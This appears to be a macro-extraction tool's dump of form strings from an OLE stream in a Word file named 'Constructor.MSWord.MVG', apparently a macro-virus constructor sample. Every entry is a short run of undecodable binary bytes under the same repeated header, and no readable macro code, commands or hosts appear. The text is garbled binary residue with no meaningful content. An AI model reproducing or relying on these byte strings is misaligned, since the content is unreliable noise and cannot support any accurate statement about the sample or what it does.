- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��]z�Q���c��$�8�dB���+�|�ۻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�	�ֵ�˫�P�p6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ܝX��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�e�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��%���-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X�e���pE[/�z�h�۠�І�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.ou3�4�FRE'lA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R2B@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I~���䣨�`�4y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l p3�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xx��І�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��in��ݚ$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(o�PY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YD�*�8�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D�L lN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a.���'Vu�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8*��i�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]&�#ܴ�>�Ø	u��@V�%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ͤ�_q&Zx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"�Xm�V9��]��B�Ap8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƕH'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䤩7%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;��	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m���t�I|�ӑj�!pUf�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U,��
*I��Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����dċ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��1�+`��Zf��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�oL ������A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D}2���'a.2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�� 1��F7�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`=3��	DJ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fp���t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QK*@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ma��OE�*e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Ш�n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$')�ay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�5�HE݌ڜ.F9�\�r5��!�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q�N�؅24�2�Fb�
�׎�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��jp��8

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֝T ;\�@ZܢOC	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`V*P�`.�AL�'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2f�*�Ҁ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�����T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ox
\�^���-!@K{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d@Lv��8����p'O�+Q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ia��SK2��X�F>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d&M��Și
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$�O԰
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ӌ��ʀ�섁DZg/�2F���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �A}gq��ߓ�i�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zmh
]�U�b'2��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J`\9Ӝ�8,����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�	��)m��C���Ĺ�bMj.i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;P�G��fՁ�ApGk*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@��J��wUI�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ư�Ĵ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[wȉ␓�z��&��1G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xnC��a*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^(�ώ�Q�vJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gb���EM�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S����`�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�]M��<�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ȁ�q?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cp�l�4��W]��"�>��EK�6�Q8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l)(5�̎N3�e7���>���R�4:�n�a�8�:g�ػ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�ҕ����(Lc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F9��QL,'ES��х�f��X���e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2Q�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pb(Cq��{~]y�76����$O�S��l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$΍V�`E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}֓(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��:bz����]$>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=��X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]j�P3Ueg@"bN�ɜ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��an
^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǣpB�<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ofu���l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a<�I&Y����fɥc%{�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KS۴(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

ؚ+0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ȁב��,i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݶ&�թ�|2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x���vbd��I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڱ�NW��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����X��M��b���R�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x^�8#��a�@5A�dɎ�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w'	R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�1/XS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&{AD��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�!3bA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�?�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�eqCT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�d��#,�Q<c�\
4PSCy��]��z��Cr�:��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y~�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7l���V"7&d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%"��Oz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�#~��0*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%1��Ib�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�)#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4P- �EWrr��14�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E��+(P"���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*���Q%�P��Yt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�"�4*�bT8uT3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aeg�(5R��Q��?�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6(`�<�SȢ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�)��Q�r+L�QȂ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1*�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��67�Fe�2	T41�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B��mE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1dQV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5K�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��Q�h-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y"�g���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��X�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X#t��TE5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/@�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+]&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
